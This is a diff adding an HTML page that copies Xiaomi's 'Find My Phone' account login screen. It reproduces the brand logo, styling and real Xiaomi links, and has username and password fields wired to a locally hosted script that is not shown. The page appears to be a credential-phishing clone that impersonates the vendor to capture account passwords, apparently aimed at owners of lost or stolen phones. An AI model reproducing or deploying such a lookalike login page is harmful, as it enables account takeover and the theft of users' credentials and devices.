@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="icon" href="https://cdn.web-global.fds.api.mi-img.com/mcfe--mi-account/static/favicon_new.ico" />
+    <title>小米查找手机-登录</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="google" content="notranslate" />
+    <link rel="stylesheet" href="./static/index.css">
+    <link rel="stylesheet" href="./static/font.css">
+    <link rel="stylesheet" href="./static/wrapper.css">
+    <script src="https://unpkg.com/vue@2.6.14/dist/vue.js"></script>
+    <script src="https://unpkg.com/crypto-js@4.1.1/crypto-js.js"></script>
+</head>
+
+<body>
+    <div class="__page_loading" id="__page_loading" >
+        <div id="__page_loading__img_wrap">
+            <svg class="__page_loading__img" id="__page_loading__img" width="81" height="80" viewBox="0 0 81 80" fill="none" xmlns="http://www.w3.org/2000/svg"><path opacity="0.8" fill-rule="evenodd" clip-rule="evenodd" d="M80.5 40C80.5 62.0914 62.5914 80 40.5 80C18.4086 80 0.5 62.0914 0.5 40C0.5 17.9086 18.4086 0 40.5 0C62.5914 0 80.5 17.9086 80.5 40ZM72.6042 40.013C72.6042 57.6861 58.2773 72.013 40.6042 72.013C22.9311 72.013 8.60417 57.6861 8.60417 40.013C8.60417 22.3399 22.9311 8.01302 40.6042 8.01302C58.2773 8.01302 72.6042 22.3399 72.6042 40.013ZM24.5 48C28.9183 48 32.5 44.4183 32.5 40C32.5 35.5817 28.9183 32 24.5 32C20.0817 32 16.5 35.5817 16.5 40C16.5 44.4183 20.0817 48 24.5 48Z" fill="black"></path></svg>
+        </div>
+        <div id="__page_loading__mask"></div>
+    </div>
+    <!-- <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKwAAAB0CAYAAAAYXNmaAAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAPzSURBVHgB7d0tUhxRFIbhAyNQqChYAC6KDaCiSHwqnqi4bAAVlwWwgETFJFEoXBQuJqjEwAIGFZX7MQMZ/mb6597b5zTvU3Wmp6Yp1Fu3erqh7pqN13aa12n20mzNPztLc5rmU5oLQzhrNk4K9SDN5iPnz9N8THNiCGVi46NQ36XZWPIzCvmFzcI9M4QxthX2YD5NTdO8mh8RwJhW2Laxilbhvza7rkUA6zYOXWK9tm8IYwzB9olVtg1hRA+2b6wIJnKwuWLlLkEgUYPNubL+MoQR8bZW7suAl8ZTrzCirbC5Yz0yYg0l0gpbItYjQyhRgiVWXIkQLLHihvdgiRW3eA6WWHGP12CJFQ/yGCyx4lHegiVWLOUpWGLFSl6CJVY04iFYYkVjQwdLrGhlyGCJFa0NFSyxopMhgiVWdFY7WGJFLzWDJVb0VitYYkUWNYIlVmRTOlhiRVYlgyVWZFcqWGJFESWCJVYUkztYYkVROYMlVhSXK1hiRRU5giVWVNM3WGJFVX2CJVZU1zVYYsUgugRLrBhM22CJFYNqEyyxYnBNgyVWuNAkWGKFG6uCJVa4sixYYoU7jwVLrHDpoWCJFW7dDbbE3q3sg4U2pmnO05yk+X735GKwJWIF+lC4b21h0ZvMj8QKjzbT7Nlstb3UB1pht9N8NcAvrbRv0ky11ywrK7zTorqvNwp2xwD/9vRCsIhiVy/Rtp/H07alYLlPiiguFOyJAf6d6UXBfrbZ0wXAs296UbC6x8Wzfnh2/aj25knXz/lx1wB/9Hj2j95MFj48nR+JFl5oZX1v/xfUW8EK0cIDfcH6kuYwze/FE7X+gFsXzFwno4mlt1n5FxmEMllyLvflwe6d3wu0NllxnmjhyqpghWjhRpNghWjhQtNghWgxuDbBCtFiUG2DFaLFYLoEK0SLQXQNVogW1fUJVogWVfUNVogW1eQIVogWVeQKVogWxeUMVogWReUOVogWxZQIVogWRZQKVogW2ZUMVogWWZUOVogW2dQIVogWWdQKVogWvdUMVogWvdQOVogWnQ0RrBAtOhkqWCFatDZksEK0aGXoYIVo0ZiHYIVo0YiXYIVosZKnYIVosZS3YIVo8SiPwQrR4kFegxWixT2egxWixS3egxWixY0IwQrR4kqUYKVEtFNb2AMK/kUKVnJH+zzNcZpLQwjRgpWc0W7YbOunH4YQIgYrOaN9ZrMdzRFA1GAlV7SbxoZ3YaxbbOyu+MREXmGv9V1przfiRQBjCFb6RKu7BHzpCmIswUqXaM/TfDBua4UxpmClbbSHxoODUMYWrDSJVk+4tLIeG0JZs/HaTnOQZmc+oi9YJza77zo1hPMPER/1sdxnEV8AAAAASUVORK5CYII=" alt="back"> -->
+    <div id="root">
+        <div class="header">
+            <div class="head-left" @click="showLang">
+                <span>{{'change_language' | lang}}</span>
+                <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M7 10l5 5 5-5z"></path>
+                </svg>
+                <!-- <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKwAAAB0CAYAAAAYXNmaAAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAPzSURBVHgB7d0tUhxRFIbhAyNQqChYAC6KDaCiSHwqnqi4bAAVlwWwgETFJFEoXBQuJqjEwAIGFZX7MQMZ/mb6597b5zTvU3Wmp6Yp1Fu3erqh7pqN13aa12n20mzNPztLc5rmU5oLQzhrNk4K9SDN5iPnz9N8THNiCGVi46NQ36XZWPIzCvmFzcI9M4QxthX2YD5NTdO8mh8RwJhW2Laxilbhvza7rkUA6zYOXWK9tm8IYwzB9olVtg1hRA+2b6wIJnKwuWLlLkEgUYPNubL+MoQR8bZW7suAl8ZTrzCirbC5Yz0yYg0l0gpbItYjQyhRgiVWXIkQLLHihvdgiRW3eA6WWHGP12CJFQ/yGCyx4lHegiVWLOUpWGLFSl6CJVY04iFYYkVjQwdLrGhlyGCJFa0NFSyxopMhgiVWdFY7WGJFLzWDJVb0VitYYkUWNYIlVmRTOlhiRVYlgyVWZFcqWGJFESWCJVYUkztYYkVROYMlVhSXK1hiRRU5giVWVNM3WGJFVX2CJVZU1zVYYsUgugRLrBhM22CJFYNqEyyxYnBNgyVWuNAkWGKFG6uCJVa4sixYYoU7jwVLrHDpoWCJFW7dDbbE3q3sg4U2pmnO05yk+X735GKwJWIF+lC4b21h0ZvMj8QKjzbT7Nlstb3UB1pht9N8NcAvrbRv0ky11ywrK7zTorqvNwp2xwD/9vRCsIhiVy/Rtp/H07alYLlPiiguFOyJAf6d6UXBfrbZ0wXAs296UbC6x8Wzfnh2/aj25knXz/lx1wB/9Hj2j95MFj48nR+JFl5oZX1v/xfUW8EK0cIDfcH6kuYwze/FE7X+gFsXzFwno4mlt1n5FxmEMllyLvflwe6d3wu0NllxnmjhyqpghWjhRpNghWjhQtNghWgxuDbBCtFiUG2DFaLFYLoEK0SLQXQNVogW1fUJVogWVfUNVogW1eQIVogWVeQKVogWxeUMVogWReUOVogWxZQIVogWRZQKVogW2ZUMVogWWZUOVogW2dQIVogWWdQKVogWvdUMVogWvdQOVogWnQ0RrBAtOhkqWCFatDZksEK0aGXoYIVo0ZiHYIVo0YiXYIVosZKnYIVosZS3YIVo8SiPwQrR4kFegxWixT2egxWixS3egxWixY0IwQrR4kqUYKVEtFNb2AMK/kUKVnJH+zzNcZpLQwjRgpWc0W7YbOunH4YQIgYrOaN9ZrMdzRFA1GAlV7SbxoZ3YaxbbOyu+MREXmGv9V1przfiRQBjCFb6RKu7BHzpCmIswUqXaM/TfDBua4UxpmClbbSHxoODUMYWrDSJVk+4tLIeG0JZs/HaTnOQZmc+oi9YJza77zo1hPMPER/1sdxnEV8AAAAASUVORK5CYII=" alt="back"> -->
+            </div>
+            <div class="head-right">
+                <a class="privac" href="https://privacy.mi.com/miaccount/zh_CN/">
+                    <svg style="font-size: .8rem;" class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24"
+                        aria-hidden="true">
+                        <path
+                            d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z">
+                        </path>
+                    </svg>
+                </a>
+                <a class="help" href="https://account.xiaomi.com/helpcenter?_locale=zh_CN">{{'help'|lang}}
+                </a>
+            </div>
+        </div>
+        <div class="Mui-src-portals-mobile-components-Banner--src-portals-mobile-components-Banner-indextsx-root"><svg
+                class="Mui-src-portals-mobile-components-Banner--src-portals-mobile-components-Banner-indextsx-logo"
+                width="48" height="48" viewBox="0 0 48 48" fill="none">
+                <g id="48*48">
+                    <mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="48" height="48">
+                        <path id="Clip 2" fill-rule="evenodd" clip-rule="evenodd"
+                            d="M0 3.05176e-05H48V47.9998H0V3.05176e-05Z" fill="white"></path>
+                    </mask>
+                    <g mask="url(#mask0)">
+                        <path id="Fill 1" fill-rule="evenodd" clip-rule="evenodd"
+                            d="M42.9972 5.015C38.4683 0.503953 31.9571 0 24.0001 0C16.0329 0 9.51214 0.509889 4.98532 5.03265C0.459587 9.55464 0 16.0649 0 24.0234C0 31.9816 0.459587 38.4954 4.98719 43.018C9.51418 47.5421 16.0334 47.9998 24.0001 47.9998C31.9665 47.9998 38.4858 47.5421 43.013 43.018C47.5398 38.4939 48 31.9816 48 24.0234C48 16.0548 47.5343 9.53698 42.9972 5.015Z"
+                            fill="#FF6900"></path>
+                        <path id="Fill 3" fill-rule="evenodd" clip-rule="evenodd"
+                            d="M22.2335 32.8946C22.2335 33.0556 22.0979 33.1892 21.9328 33.1892H17.8394C17.6715 33.1892 17.5353 33.0556 17.5353 32.8946V22.19C17.5353 22.0276 17.6715 21.8946 17.8394 21.8946H21.9328C22.0979 21.8946 22.2335 22.0276 22.2335 22.19V32.8946Z"
+                            fill="white"></path>
+                        <path id="Fill 5" fill-rule="evenodd" clip-rule="evenodd"
+                            d="M30.248 32.8946C30.248 33.0556 30.1118 33.1892 29.9461 33.1892H26.0497C25.8826 33.1892 25.7464 33.0556 25.7464 32.8946V32.8546V23.6589C25.7423 22.0465 25.6501 20.3892 24.8177 19.5562C24.1019 18.8383 22.7672 18.6738 21.3787 18.6393H14.3157C14.149 18.6393 14.0144 18.7733 14.0144 18.9345V31.9287V32.8946C14.0144 33.0556 13.8769 33.1892 13.7102 33.1892H9.81124C9.64471 33.1892 9.51068 33.0556 9.51068 32.8946V15.1074C9.51068 14.9441 9.64471 14.8113 9.81124 14.8113H21.0604C24.0003 14.8113 27.0737 14.9454 28.5895 16.4632C30.1118 17.9877 30.248 21.0556 30.248 23.9989V32.8946Z"
+                            fill="white"></path>
+                        <path id="Fill 7" fill-rule="evenodd" clip-rule="evenodd"
+                            d="M38.2749 32.8946C38.2749 33.0556 38.1372 33.1892 37.9721 33.1892H34.0738C33.9072 33.1892 33.7718 33.0556 33.7718 32.8946V15.1074C33.7718 14.9441 33.9072 14.8113 34.0738 14.8113H37.9721C38.1372 14.8113 38.2749 14.9441 38.2749 15.1074V32.8946Z"
+                            fill="white"></path>
+                    </g>
+                </g>
+            </svg>
+            <div class="Mui-src-portals-mobile-components-Banner--src-portals-mobile-components-Banner-indextsx-slogan"
+                style="transform: none; transition: transform 225ms cubic-bezier(0, 0, 0.2, 1) 0ms;">{{'slogan'|lang}}</div>
+        </div>
+        <div class="">
+            <div
+                class="Mui-src-portals-mobile-components-Container--src-portals-mobile-components-Container-indextsx-root Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-container">
+                <div>
+                    <div
+                        class="Mui-src-portals-mobile-components-LoginFormLegend--src-portals-mobile-components-LoginFormLegend-indextsx-legend Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-legend">
+                        {{'sign'|lang}}</div>
+                    <div
+                        class="MuiFormControl-root MuiTextField-root Mui-src-portals-mobile-components-TextField--src-portals-mobile-components-TextField-indextsx-root Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-field MuiFormControl-fullWidth">
+                        <div class="
+                            MuiInputBase-root 
+                            MuiInput-root 
+                            MuiInputBase-fullWidth 
+                            MuiInput-fullWidth 
+                            MuiInputBase-formControl 
+                            MuiInput-formControl
+                            "
+                            ref="usr"
+                            >
+                            <!-- Mui-focused -->
+                            <input 
+                            v-model="usr"
+                            @focus="usrfocus"
+                            @blur="usrblur"
+                            aria-invalid="false" autocomplete="off" name="account" :placeholder="'acc_place'|lang"
+                                type="text" class="MuiInputBase-input MuiInput-input" value="">
+                        </div>
+                        <p 
+                        v-if="usr_msg"
+                        class="MuiFormHelperText-root Mui-error">
+                            {{usr_msg}}
+                        </p>
+                    </div>
+                    <div
+                        class="MuiFormControl-root MuiTextField-root Mui-src-portals-mobile-components-TextField--src-portals-mobile-components-TextField-indextsx-root Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-field Mui-src-portals-mobile-components-PasswordField--src-portals-mobile-components-PasswordField-indextsx-root MuiFormControl-fullWidth">
+                        <div
+                        ref="pwd"
+                            class="
+                            MuiInputBase-root 
+                            MuiInput-root 
+                            MuiInputBase-fullWidth 
+                            MuiInput-fullWidth 
+                            MuiInputBase-formControl 
+                            MuiInput-formControl 
+                            ">
+                            <!-- MuiInputBase-adornedEnd -->
+                            <!-- Mui-error -->
+                            <input 
+                            v-model="pwd"
+                            @focus="pwdfocus"
+                            @blur="pwdblur"
+                            aria-invalid="false" autocomplete="off" id="password-1614" name="password"
+                                :placeholder="'pwd_place'|lang" :type="pwd_show?'text':'password'"
+                                class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedEnd" value="">
+                            <div class="MuiInputAdornment-root MuiInputAdornment-positionEnd">
+                                <div
+                                    @click="pwd_show = !pwd_show"
+                                    class="Mui-src-portals-mobile-components-PasswordField--src-portals-mobile-components-PasswordField-indextsx-icon Mui-src-portals-mobile-components-PasswordField--src-portals-mobile-components-PasswordField-indextsx-off">
+                                    <svg 
+                                    :style="{color: pwd_show?'#0B84FF':'rgba(0,0,0,0.1)',cursor: 'pointer'}"
+                                    viewBox="-3 -10 63 56" width="1em" height="1em" aria-label="password show">
+                                        <g fill="none" fill-rule="evenodd">
+                                            <path
+                                                d="M3 22.974C7.044 11.382 18.55 3 30.2 3c11.65 0 23.155 8.382 27.199 19.974C53.328 34.593 41.71 43 30.199 43 18.69 43 7.072 34.593 3 22.974h0z"
+                                                stroke="currentColor" stroke-width="5" stroke-linecap="round"
+                                                stroke-linejoin="round"></path>
+                                            <path
+                                                d="M30.2 33.4c5.743 0 10.4-4.656 10.4-10.4 0-5.743-4.657-10.4-10.4-10.4-5.744 0-10.4 4.657-10.4 10.4 0 5.744 4.656 10.4 10.4 10.4z"
+                                                fill="currentColor" fill-rule="nonzero"></path>
+                                        </g>
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                        <p 
+                        v-if="pwd_msg"
+                        class="MuiFormHelperText-root Mui-error">
+                            {{pwd_msg}}
+                        </p>
+                    </div>
+                    <div
+                        class="Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-accept Mui-src-portals-mobile-components-AcceptTerms--src-portals-mobile-components-AcceptTerms-indextsx-root">
+                        <label
+                            class="Mui-src-portals-mobile-components-Checkbox--src-portals-mobile-components-Checkbox-indextsx-controlLabel"><span
+                                class="MuiButtonBase-root MuiIconButton-root jss2 MuiCheckbox-root MuiCheckbox-colorSecondary Mui-src-portals-mobile-components-Checkbox--src-portals-mobile-components-Checkbox-indextsx-root MuiIconButton-colorSecondary"
+                                aria-disabled="false"><span class="MuiIconButton-label">
+                                    <input class="jss5"
+                                        type="checkbox" data-indeterminate="false" v-model="privc">
+                                        <span 
+                                        class="Mui-src-portals-mobile-components-Checkbox--src-portals-mobile-components-Checkbox-indextsx-icon
+                                        
+                                        "
+                                        :class="privc?'Mui-src-portals-mobile-components-Checkbox--src-portals-mobile-components-Checkbox-indextsx-checkedIcon':''"
+                                        ></span></span><span class="MuiTouchRipple-root"></span></span><span
+                                class="Mui-src-portals-mobile-components-Checkbox--src-portals-mobile-components-Checkbox-indextsx-label">{{'yydty'|lang}}
+                                <a class="MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorPrimary"
+                                    target="_blank" href="https://static.account.xiaomi.com/html/agreement/user/zh_CN.html">{{'yhxy'| lang}}</a> {{'and'|lang}} <a
+                                    class="MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorPrimary"
+                                    target="_blank" href="https://privacy.mi.com/miaccount/zh_CN/">{{'yszc'|lang}}</a></span></label>
+                    </div>
+                    <button
+                        class="
+                        MuiButtonBase-root
+                        MuiButton-root
+                        MuiButton-contained
+                        Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-button
+                        Mui-src-portals-mobile-components-Button--src-portals-mobile-components-Button-indextsx-root
+                        MuiButton-containedPrimary
+                        MuiButton-disableElevation
+                        MuiButton-fullWidth
+                        MuiButton-containedPrimary
+                        "
+                        @click="login"
+                        :class="confirmed?'MuiButton-containedPrimary':'Mui-disabled'"
+                        tabindex="-1" >
+                        <svg 
+                        v-show="loading"
+                        class="__page_loading__img btn-load" id="__page_loading__img" width="81" height="80" viewBox="0 0 81 80" fill="none" xmlns="http://www.w3.org/2000/svg"><path opacity="0.8" fill-rule="evenodd" clip-rule="evenodd" d="M80.5 40C80.5 62.0914 62.5914 80 40.5 80C18.4086 80 0.5 62.0914 0.5 40C0.5 17.9086 18.4086 0 40.5 0C62.5914 0 80.5 17.9086 80.5 40ZM72.6042 40.013C72.6042 57.6861 58.2773 72.013 40.6042 72.013C22.9311 72.013 8.60417 57.6861 8.60417 40.013C8.60417 22.3399 22.9311 8.01302 40.6042 8.01302C58.2773 8.01302 72.6042 22.3399 72.6042 40.013ZM24.5 48C28.9183 48 32.5 44.4183 32.5 40C32.5 35.5817 28.9183 32 24.5 32C20.0817 32 16.5 35.5817 16.5 40C16.5 44.4183 20.0817 48 24.5 48Z" fill="#e9f4ff"></path></svg>
+                        <!-- .MuiButton-containedPrimary -->
+                        <span class="MuiButton-label"
+                        style="width: auto;"
+                        >{{'login'|lang}}</span></button>
+                    <div
+                        class="Mui-src-portals-mobile-pages-Login-Password--src-portals-mobile-pages-Login-Password-indextsx-actionList">
+                        <a
+                            class="MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorTextSecondary"
+                            href="https://account.xiaomi.com/fe/service/register/phone?_locale=zh_CN">{{'regis'|lang}}</a>
+                        <div>｜</div><a
+                            class="MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorTextSecondary"
+                            href="https://account.xiaomi.com/fe/service/forgetPassword?_locale=zh_CN">{{'forget'|lang}}</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="wrapper" >
+        <transition name="slide-fade">
+        <div class="wrapper" v-if="show">
+            <header
+                class="Mui-src-portals-mobile-components-PageTitle--src-portals-mobile-components-PageTitle-Navbartsx-navbar">
+                <button
+                    @click="show = false"
+                    class="MuiButtonBase-root MuiIconButton-root Mui-src-portals-mobile-components-PageTitle--src-portals-mobile-components-PageTitle-Navbartsx-button Mui-src-portals-mobile-components-PageTitle--src-portals-mobile-components-PageTitle-Navbartsx-back"
+                    tabindex="0" type="button"><span class="MuiIconButton-label"><img
+                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKwAAAB0CAYAAAAYXNmaAAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAPzSURBVHgB7d0tUhxRFIbhAyNQqChYAC6KDaCiSHwqnqi4bAAVlwWwgETFJFEoXBQuJqjEwAIGFZX7MQMZ/mb6597b5zTvU3Wmp6Yp1Fu3erqh7pqN13aa12n20mzNPztLc5rmU5oLQzhrNk4K9SDN5iPnz9N8THNiCGVi46NQ36XZWPIzCvmFzcI9M4QxthX2YD5NTdO8mh8RwJhW2Laxilbhvza7rkUA6zYOXWK9tm8IYwzB9olVtg1hRA+2b6wIJnKwuWLlLkEgUYPNubL+MoQR8bZW7suAl8ZTrzCirbC5Yz0yYg0l0gpbItYjQyhRgiVWXIkQLLHihvdgiRW3eA6WWHGP12CJFQ/yGCyx4lHegiVWLOUpWGLFSl6CJVY04iFYYkVjQwdLrGhlyGCJFa0NFSyxopMhgiVWdFY7WGJFLzWDJVb0VitYYkUWNYIlVmRTOlhiRVYlgyVWZFcqWGJFESWCJVYUkztYYkVROYMlVhSXK1hiRRU5giVWVNM3WGJFVX2CJVZU1zVYYsUgugRLrBhM22CJFYNqEyyxYnBNgyVWuNAkWGKFG6uCJVa4sixYYoU7jwVLrHDpoWCJFW7dDbbE3q3sg4U2pmnO05yk+X735GKwJWIF+lC4b21h0ZvMj8QKjzbT7Nlstb3UB1pht9N8NcAvrbRv0ky11ywrK7zTorqvNwp2xwD/9vRCsIhiVy/Rtp/H07alYLlPiiguFOyJAf6d6UXBfrbZ0wXAs296UbC6x8Wzfnh2/aj25knXz/lx1wB/9Hj2j95MFj48nR+JFl5oZX1v/xfUW8EK0cIDfcH6kuYwze/FE7X+gFsXzFwno4mlt1n5FxmEMllyLvflwe6d3wu0NllxnmjhyqpghWjhRpNghWjhQtNghWgxuDbBCtFiUG2DFaLFYLoEK0SLQXQNVogW1fUJVogWVfUNVogW1eQIVogWVeQKVogWxeUMVogWReUOVogWxZQIVogWRZQKVogW2ZUMVogWWZUOVogW2dQIVogWWdQKVogWvdUMVogWvdQOVogWnQ0RrBAtOhkqWCFatDZksEK0aGXoYIVo0ZiHYIVo0YiXYIVosZKnYIVosZS3YIVo8SiPwQrR4kFegxWixT2egxWixS3egxWixY0IwQrR4kqUYKVEtFNb2AMK/kUKVnJH+zzNcZpLQwjRgpWc0W7YbOunH4YQIgYrOaN9ZrMdzRFA1GAlV7SbxoZ3YaxbbOyu+MREXmGv9V1przfiRQBjCFb6RKu7BHzpCmIswUqXaM/TfDBua4UxpmClbbSHxoODUMYWrDSJVk+4tLIeG0JZs/HaTnOQZmc+oi9YJza77zo1hPMPER/1sdxnEV8AAAAASUVORK5CYII="
+                            class="Mui-src-portals-mobile-components-PageTitle--src-portals-mobile-components-PageTitle-Navbartsx-backImg"
+                            alt=""></span><span class="MuiTouchRipple-root"></span></button>
+            </header>
+            <div
+                class="Mui-src-portals-mobile-components-PageTitle--src-portals-mobile-components-PageTitle-indextsx-pageTitle">
+                {{'change_language'|lang}}</div>
+            <ul class="MuiList-root MuiList-padding">
+                <div class="MuiButtonBase-root MuiListItem-root Mui-src-portals-mobile-components-LanguagePicker--src-portals-mobile-components-LanguagePicker-indextsx-listItem MuiListItem-gutters MuiListItem-button"
+                @click="SETlanguage('zh_cn')"
+                    tabindex="0" role="button" aria-disabled="false">
+                    <div class="MuiListItemText-root"><span
+                            class="MuiTypography-root MuiListItemText-primary MuiTypography-body1 MuiTypography-displayBlock">&lrm;中文(简体)&lrm;</span>
+                    </div><span class="MuiTouchRipple-root"></span>
+                </div>
+                <div class="MuiButtonBase-root MuiListItem-root Mui-src-portals-mobile-components-LanguagePicker--src-portals-mobile-components-LanguagePicker-indextsx-listItem MuiListItem-gutters MuiListItem-button"
+                @click="SETlanguage('zh_tw')"
+                    tabindex="0" role="button" aria-disabled="false">
+                    <div class="MuiListItemText-root"><span
+                            class="MuiTypography-root MuiListItemText-primary MuiTypography-body1 MuiTypography-displayBlock">&lrm;&lrm;中文(繁體)&lrm;</span>
+                    </div><span class="MuiTouchRipple-root"></span>
+                </div>
+                <div class="MuiButtonBase-root MuiListItem-root Mui-src-portals-mobile-components-LanguagePicker--src-portals-mobile-components-LanguagePicker-indextsx-listItem MuiListItem-gutters MuiListItem-button"
+                @click="SETlanguage('en')"
+                    tabindex="0" role="button" aria-disabled="false">
+                    <div class="MuiListItemText-root"><span
+                            class="MuiTypography-root MuiListItemText-primary MuiTypography-body1 MuiTypography-displayBlock">&lrm;English</span>
+                    </div><span class="MuiTouchRipple-root"></span>
+                </div>
+            </ul>
+        </div>
+        </transition>
+    </div>
+    <div 
+    id="toast"
+    class="mi-toast mi-toast-mobile" 
+    style="display:none;position: fixed; bottom: 2.62153rem; box-shadow: rgba(0, 0, 0, 0.05) 0px 0.694444rem 1.38889rem, rgba(0, 0, 0, 0.05) 0px 0.868056rem 1.73611rem; color: rgba(0, 0, 0, 0.8); flex-grow: initial; padding: 0.625rem 0.78125rem; border-radius: 0.625rem; font-size: 0.625rem;">
+    {{'p'| lang}}
+</div>
+</body>
+<script src="./static/index.js"></script>
+<script >
+    window.onresize = function() {
+        const width = window.innerWidth;
+        if (width<=375) {
+            document.querySelector('html').style.fontSize = '20px'
+        } else if (width>=525) {
+            document.querySelector('html').style.fontSize = '28px'
+        } else {
+            let s = (width - 375) * 0.0533 + 20;
+            document.querySelector('html').style.fontSize = s+'px'
+        }
+    }
+</script>
+</html>
